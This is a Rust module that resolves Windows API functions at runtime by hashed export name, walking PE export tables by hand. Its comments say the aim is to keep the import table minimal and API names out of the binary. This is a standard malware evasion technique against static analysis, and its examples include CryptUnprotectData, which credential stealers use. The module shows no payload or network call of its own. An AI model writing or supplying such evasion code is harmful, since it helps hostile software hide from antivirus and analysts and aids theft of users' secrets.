//! Runtime Win32 API resolution by FNV-1a hashed export name.
//!
//! Keeps our import table at the kernel32 bootstrap trio and keeps plaintext
//! API names out of the compiled image (callers pass compile-time hashes).
//! Handles forwarded exports ("KERNELBASE.FuncName") by recursing into the
//! forward target.

use std::ffi::c_void;

extern "system" {
    fn GetModuleHandleW(name: *const u16) -> *mut c_void;
    fn LoadLibraryW(name: *const u16) -> *mut c_void;
}

/// FNV-1a 32-bit, computable in const context: `fnv1a("RegGetValueW")`.
pub const fn fnv1a(s: &str) -> u32 {
    let bytes = s.as_bytes();
    let mut hash: u32 = 0x811c9dc5;
    let mut i = 0;
    while i < bytes.len() {
        hash ^= bytes[i] as u32;
        hash = hash.wrapping_mul(0x01000193);
        i += 1;
    }
    hash
}

pub fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Compile-time API name hash: `api!("CryptUnprotectData")` folds the literal
/// into a u32 inside an inline const block, so the string itself never
/// reaches the binary.
#[macro_export]
macro_rules! api {
    ($s:literal) => {
        const { $crate::resolve::fnv1a($s) }
    };
}

/// Resolve an export by name hash from `dll` (loaded or loadable).
/// Returns 0 on failure.
pub unsafe fn resolve(dll: &str, name_hash: u32) -> usize {
    resolve_at(dll, name_hash, 0)
}

/// `depth` survives forwarder hops so a forwarding cycle cannot recurse
/// without bound.
unsafe fn resolve_at(dll: &str, name_hash: u32, depth: u32) -> usize {
    let w = wide(dll);
    let mut base = GetModuleHandleW(w.as_ptr());
    if base.is_null() {
        base = LoadLibraryW(w.as_ptr());
    }
    if base.is_null() {
        return 0;
    }
    find_export(base as usize, name_hash, depth)
}

fn find_export(base: usize, name_hash: u32, depth: u32) -> usize {
    if depth > 3 {
        return 0;
    }
    unsafe {
        let b = base as *const u8;
        let pe_off = *(b.add(0x3c) as *const u32) as usize;
        let nt = b.add(pe_off);
        // PE32+ optional header: data directories at nt + 4 + 20 + 112.
        let dir_rva = *(nt.add(4 + 20 + 112) as *const u32) as usize;
        if dir_rva == 0 {
            return 0;
        }
        let dir = b.add(dir_rva);
        let dir_size = *(nt.add(4 + 20 + 112 + 4) as *const u32) as usize;
        let num_names = *(dir.add(0x18) as *const u32);
        let funcs = *(dir.add(0x1c) as *const u32) as usize;
        let names = *(dir.add(0x20) as *const u32) as usize;
        let ords = *(dir.add(0x24) as *const u32) as usize;

        for i in 0..num_names as isize {
            let name_rva = *(b.add(names).offset(i * 4) as *const u32) as usize;
            let name = cstr_bytes(b.add(name_rva));
            if fnv1a_bytes(name) != name_hash {
                continue;
            }
            let ord = *(b.add(ords).offset(i * 2) as *const u16) as isize;
            let fn_rva = *(b.add(funcs).offset(ord * 4) as *const u32) as usize;
            let addr = base + fn_rva;

            // Forwarded export: RVA points inside the export directory and is
            // an ASCII string "DLL.Func". Resolve recursively.
            if fn_rva >= dir_rva && fn_rva < dir_rva + dir_size {
                let fwd = cstr_bytes(b.add(fn_rva));
                if let Some(dot) = fwd.iter().position(|&c| c == b'.') {
                    let fwd_dll = String::from_utf8_lossy(&fwd[..dot]).into_owned() + ".dll";
                    let fwd_fn = fnv1a_bytes(&fwd[dot + 1..]);
                    return resolve_at(&fwd_dll, fwd_fn, depth + 1);
                }
                return 0;
            }
            return addr;
        }
        0
    }
}

unsafe fn cstr_bytes(p: *const u8) -> &'static [u8] {
    let mut len = 0;
    while *p.add(len) != 0 {
        len += 1;
    }
    std::slice::from_raw_parts(p, len)
}

fn fnv1a_bytes(bytes: &[u8]) -> u32 {
    let mut hash: u32 = 0x811c9dc5;
    for &b in bytes {
        hash ^= b as u32;
        hash = hash.wrapping_mul(0x01000193);
    }
    hash
}
